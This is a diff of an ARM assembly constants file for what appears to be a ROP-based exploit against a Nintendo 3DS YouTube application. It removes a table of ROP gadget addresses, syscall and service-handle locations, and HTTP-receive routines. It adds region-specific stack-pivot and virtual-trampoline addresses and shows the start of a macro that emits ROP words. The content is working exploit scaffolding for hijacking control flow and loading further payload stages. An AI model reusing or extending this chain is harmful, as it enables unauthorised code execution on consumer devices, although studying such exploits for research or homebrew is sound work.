@@ -2,55 +2,18 @@ PAYLOAD_PRIM_LOC equ 0x1f05DC00
 PAYLOAD_SEC_LOC equ 0x15000000
 PAYLOAD_THIRD_LOC equ 0x15100000
 
-YTB_ROP_NOP equ 0x0012d444 ; pop {pc}
-YTB_ROP_POP_R0PC equ 0x0013b358 ; pop {r0, pc}
-YTB_ROP_POP_R1PC equ 0x0034c2f8 ; pop {r1, pc}
-YTB_ROP_POP_R4LR_BX_R1 equ 0x0034e3d8 ; pop {r4, lr} | bx r1
-YTB_ROP_POP_R4R5PC equ 0x00433754 ; pop {r4, r5, pc}
-YTB_ROP_POP_R3PC equ 0x0022a420 ; pop {r3, pc}
-YTB_ROP_POP_R4PC equ 0x0012bca4 ; pop {r4, pc}
-YTB_ROP_POP_R2R3PC equ 0x00390e59 ; pop {r2, r3, pc}
-YTB_ROP_POP_R2R3R4R5R6PC equ 0x00348e88 ; pop {r2, r3, r4, r5, r6, pc}
-YTB_ROP_POP_R4R5R6R7R8R9R10R11PC equ 0x00131198 ; pop {r4, r5, r6, r7, r8, r9, sl, fp, pc}
-YTB_ROP_POP_R4R5R6R7R8R9R10R11R12PC equ 0x001331b0 ; pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}
-YTB_ROP_BLX_R4_ADD_SPx10_POP_R4PC equ 0x001673a4 ; blx r4 ; add sp, sp, #16 ; pop {r4, pc}
+; west
+.if YTB_VERSION == "WEST"
+	YTB_VIRTUAL_TRAMPOLINE equ 0x00bc07f8
+	YTB_STACK_PIVOT equ 0x00100d84 ; ldmda r4!, {r2, r3, r6, r9, ip, sp, lr, pc}
+	YTB_STACK_PIVOT2 equ 0x00119b84 ; ldm r10!, {r4, r5, r9, r12, sp, lr, pc}
+.else
+	YTB_VIRTUAL_TRAMPOLINE equ 0x00bbf7f8
+	YTB_STACK_PIVOT equ 0x00100d84 ; ldmda r4, {r2, r3, r6, r9, ip, sp, lr, pc} (not a typo, the ! is the only difference with WEST)
+	YTB_STACK_PIVOT2 equ 0x0010d8b4 ; ldm r8!, {r8, ip, sp, lr, pc}
+.endif
 
-YTB_ROP_STR_R0R1_POP_R4PC equ 0x0012bca0 ; str r0, [r1] ; pop {r4, pc}
-YTB_ROP_STR_R0R4_POP_R4PC equ 0x001306ac ; str r0, [r4] ; pop {r4, pc}
-YTB_ROP_STM_R4R0R1_POP_R4_PC equ 0x001fb254 ; stm r4, {r0, r1} ; pop {r4, pc}
-YTB_ROP_STM_R0R1R2_POP_R4_PC equ 0x003599a0 ; stm r4, {r1, r2} ; pop {r4, pc}
-YTB_ROP_LDR_R1R1_BLX_R3 equ 0x0016e644 ; ldr r1, [r1] ; blx r3
-
-YTB_ROP_LDR_R2R1_ADD_R1SPx4_BLX_R3 equ 0x0017786c ; ldr r2, [r1] ; add r1, sp, #4 ; blx r3
-
-YTB_ROP_LDR_R0R0_POP_R4PC equ 0x00168910 ; ldr r0, [r0] ; pop {r4, pc}
-
-YTB_ROP_MRC_R0C13C03_ADD_R0R0x5C_BX_LR equ 0x001390f4 ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr
-
-YTB_ROP_ADD_R0R0R4_POP_R4PC equ 0x003107dc ; add r0, r0, r4 ; pop {r4, pc}
-
-YTB_HTTPC_STRUCT equ 0x007918bc ; + 0x4 : bool enabled (SBS), + 0x2C : http:C handle
-YTB_HTTPC_HANDLE equ YTB_HTTPC_STRUCT + 0x2C
-YTB_APT_HANDLE equ 0x0056E120
-YTB_GSPGPU_INTERRUPT_RECEIVER_STRUCT equ 0x0056AC40
-YTB_GSPGPU_HANDLE equ 0x0057A414
-YTB_DSP_HANDLE equ 0x0056C780
-
-YTB_SVC_SLEEPTHREAD equ 0x00342ebc ; svc 0xa
-YTB_SVC_SETTHREADPRIORITY equ 0x0034af34 ; svc 0xc
-YTB_SVC_SENDSYNCREQUEST equ 0x00344cc4 ; svc 0x32
-YTB_MEMCPY equ 0x0034b098
-YTB_HTTPC_INITIALIZE equ 0x00216230 ; r0 : handle ptr, r1 : 0x0 ?, r2 : 0x1000, r3 : 0x0 ?
-YTB_HTTPC_RECEIVEDATA equ 0x0020e108 ; r0 : handle ptr, r1 : httpc context handle, r2 : buffer address, r3 : buffer size
-YTB_HTTPC_CREATECONTEXTWRAPPER equ 0x0020d6d4 ; r0 : context struct (0x4 : SBZ context handle slot, 0x8 : SBZ context http:C handle slot, 0xC : same as 0x8), r1 : url ptr, r2 : request method, r3 : bool use_proxy; HTTPC_STRUCT + 0x4 SBS, HTTPC_STRUCT + 0x2c = http:C handle
-YTB_APT_ISREGISTERED equ 0x003439B8 ; r0 : appId, r1 : out_ptr
-YTB_SRV_GETSERVICEHANDLEWRAPPER equ 0x00344cfc ; r0 : out ptr, r1 : service name ptr, r2 : service name length, r3 : 0
-YTB_GSPGPU_FLUSHDATACACHE equ 0x0020f14c
-YTB_GSPGPU_GXTRYENQUEUE equ 0x002FBA28
-YTB_GSPGPU_GXCMD4 equ 0x0020E91C
-YTB_GSPGPU_FLUSHDATACACHE_WRAPPER equ 0x0020E820
-YTB_DSP_UNLOADCOMPONENT equ 0x001369A4
-YTB_DSP_REGISTERINTERRUPTEVENTS equ 0x00136A38
+YTB_HTTPC_HANDLE equ (YTB_HTTPC_STRUCT + 0x2C)
 
 .macro set_lr,_lr
 	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
